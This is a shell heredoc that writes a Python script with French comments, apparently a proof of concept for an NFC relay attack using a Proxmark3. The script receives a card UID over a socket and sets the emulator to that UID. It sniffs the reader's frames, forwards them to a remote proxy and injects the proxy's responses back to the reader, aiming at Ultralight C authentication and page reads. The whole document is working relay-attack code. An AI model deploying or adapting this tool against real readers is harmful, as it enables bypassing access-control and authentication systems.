cat << 'EOF' > proxy.py
import subprocess
import socket
import time

#Code a copier coler dans proxmark3 -

# --- CONFIGURATION ---
PM3_PATH = "./client/proxmark3.exe"
PORT_PM3 = "COM10"
PROXY_IP = "127.0.0.1" # IP de l'ordinateur Proxy
PORT_NET = 5555

def pm3_exec(cmd):
    # On utilise Popen pour certaines commandes pour ne pas bloquer
    return subprocess.run([PM3_PATH, PORT_PM3, "-c", cmd], capture_output=True, text=True).stdout

def start_proxy():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((PROXY_IP, PORT_NET))
        uid = s.recv(1024).decode()
        print(f"[*] UID reçu : {uid}. Préparation du simulateur...")

        # 1. Configurer l'UID pour anticollision automatique (simulable)
        pm3_exec(f"hf mfu setuid {uid}")
        
        # 2. Lancer la simulation en tâche de fond
        # On utilise une commande qui permet de voir passer les trames
        print("[*] Simulation lancée. Surveillance du lecteur...")
        
        # Pour ton POC, le lecteur va envoyer '1A 00' (Auth) ou '30 04' (Read)
        # On boucle sur le 'hf 14a list' pour voir l'historique des trames reçues
        try:
            while True:
                history = pm3_exec("hf 14a list")
                
                for i in history.split('\n'):
                    print(i)
                    #i il faut enlever l'espace et mettre en minuscule pour le proxy
                    i_clean = i.strip().lower().replace(" ", "")
                    s.sendall(i_clean.encode()) 
                    time.sleep(0.1) # Petite pause pour éviter de saturer le proxy
                    resp = s.recv(1024).decode()
                    # On injecte la réponse du proxy au lecteur
                    print(f"[*] Injection de la réponse : {resp}")
                    pm3_exec(f"hf 14a raw {resp}") 
                
                
                
                #Partie pas utile en soit, juste pour affichage
                # On cherche une commande spécifique non répondue (ex: Auth Ultralight C)
                if "60  00" in history:
                    print("[!] Authentification détectée !")
                    s.sendall("1a00".encode())
                    resp = s.recv(1024).decode()
                    
                    # On injecte la réponse du proxy au lecteur
                    print(f"[*] Injection de la réponse : {resp}")
                    pm3_exec(f"hf 14a raw {resp}") 
                
                # Exemple pour une lecture de page spécifique (ex: page 4)
                elif "30  04" in history:
                    print("[!] Lecture Page 04 détectée !")
                    s.sendall("3004".encode())
                    resp = s.recv(1024).decode()
                    pm3_exec(f"hf 14a raw {resp}")

                time.sleep(0.1) # Fréquence de rafraîchissement du sniffer
        except KeyboardInterrupt:
            print("Arrêt du Proxy.")

if __name__ == "__main__":
    start_proxy()
EOF